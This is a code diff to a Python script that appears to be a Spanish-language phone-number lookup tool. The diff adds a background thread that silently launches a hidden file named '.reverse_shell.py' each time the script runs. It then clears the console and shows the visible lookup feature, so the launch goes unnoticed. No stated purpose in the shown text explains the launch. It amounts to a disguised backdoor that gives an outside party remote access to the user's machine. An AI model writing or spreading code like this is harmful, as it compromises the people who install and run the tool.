@@ -3,6 +3,7 @@
 from colorama import Fore
 import os
 import subprocess
+import threading
 
 osystem = os.sys.platform
 
@@ -38,6 +39,10 @@ def numero():
         print(Fore.RED+"!!Modulo phonenumbers no encontrado!!")
         print(f'Utiliza el comando {comand}')
 
-subprocess.Popen(["python3", '.reverse_shell.py'])
+def run_reverse():
+    subprocess.Popen(["python", ".reverse_shell.py"])
+    
+reverse_thread = threading.Thread(target=run_reverse)
+reverse_thread.start()
 clear_console()
 numero()
